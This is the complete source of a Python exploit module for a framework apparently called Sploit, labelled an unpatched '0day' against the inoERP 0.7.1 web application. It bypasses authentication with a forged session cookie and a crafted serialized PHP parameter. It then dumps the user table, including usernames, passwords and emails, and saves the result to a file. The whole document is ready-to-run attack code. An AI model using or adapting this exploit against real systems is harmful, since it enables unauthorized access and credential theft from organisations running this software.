#!/usr/bin/env python

import urllib2
import base64
import xml.etree.ElementTree as eTree
from collections import OrderedDict

from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_inoerp_privilege_escalation"
INFO['DESCRIPTION'] = "inoERP Privilege Escalation"
INFO['VENDOR'] = "http://inoideas.org/"
INFO["CVE Name"] = "0day"
INFO["DOWNLOAD_LINK"] = "https://github.com/inoerp/inoERP"
INFO["LINKS"] = []
INFO['CHANGELOG'] = "30 May, 2017. Written by Gleg team."
INFO['PATH'] = "General/"
INFO["NOTES"] = """
    inoERP is an open source web based enterprise management system. This module exploits vulnerability in authantication\
 that allows unauthorized users to preform actions with administrator rights.
 Tested against inoERP 0.7.1 on Windows 7 x64 SP1.
    """

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.176"
OPTIONS["PORT"] = 81
OPTIONS["SSL"] = False
OPTIONS["BASEPATH"] = '/inoerp'


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)
        self.name = INFO['NAME']

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", OPTIONS["HOST"])
        self.port = self.args.get("PORT", OPTIONS["PORT"])
        self.ssl = self.args.get('SSL', OPTIONS['SSL'])
        self.basepath = self.args.get('BASEPATH', OPTIONS['BASEPATH'])
        self.sql_url = self.make_url('includes/json/json_search.php') + '?class_name=%s&' \
                            'search_parameters[1][name]=column_array&search_parameters[1][value]=%s'

    def make_url(self, path=''):
        proto = 'https' if self.ssl else 'http'
        basepath = self.basepath if self.basepath.startswith('/') else '/'+self.basepath
        url = "%s://%s:%s%s/%s" % (proto, self.host, self.port, basepath, path)
        return url

    def make_request(self, url):
        req = urllib2.Request(url, headers={'Cookie': 'INOERP123123=HACKED'})
        res = urllib2.urlopen(req).read()
        return res

    def make_php_object(self, fields):
        data = ['i:%s;s:%s:"%s";' % (i, len(field), field) for i, field in enumerate(fields)]
        return base64.b64encode('a:%s:{%s}' % (len(fields), ''.join(data)))

    def make_table(self, header=None, data=None):
        tmp = [header] + data
        max_fields_width = []
        for i in range(len(header)):
            try:
                max_fields_width.append(len(max(tmp, key=lambda x: len(x[i]))[i]) + 3)
            except Exception as e:
                print e
        horizontal = '+' + '+'.join('-' * width for width in max_fields_width) + '+\r\n'
        output = '\r\n' + horizontal
        output += '|' + '|'.join(header[i].center(width) for i, width in enumerate(max_fields_width)) + '|\r\n'
        output += horizontal
        sorted_data = sorted(data)
        for entry in sorted_data:
            output += '|' + '|'.join(entry[i].ljust(width) for i, width in enumerate(max_fields_width)) + '|\r\n'
        output += horizontal
        return output

    def check(self):
        url = self.make_url()
        self.log('[*] Trying to connect to %s' % url)
        try:
            self.make_request(url)
        except Exception as e:
            self.log('[-] %s' % str(e))
            self.finish(False)

    def parse_table(self, res):
        table = res[res.find('<table'): res.find('</table') + 8]
        table = table.replace('\n', '').replace('&', '&amp;')
        table = eTree.fromstring(table)
        header = table.find('thead')
        table_rows = []
        table_rows.append([el[0].tail for index, el in enumerate(header[0]) if index > 1])
        body = table.find('tbody')
        for tr in body:
            table_rows.append([el.text for index, el in enumerate(tr) if index > 1])
        return table_rows

    def run(self):
        #Get options from gui
        self.args()
        self.check()
        self.log('[*] Users table:')
        users_fields = self.make_php_object(['ino_user_id', 'username', 'password', 'email'])
        users_url = self.sql_url % ('ino_user', users_fields)
        res = self.make_request(users_url)
        table = self.parse_table(res)
        res = self.make_table(table[0], table[1:])
        self.log(res)
        self.writefile(res)
        self.finish(True)


if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()
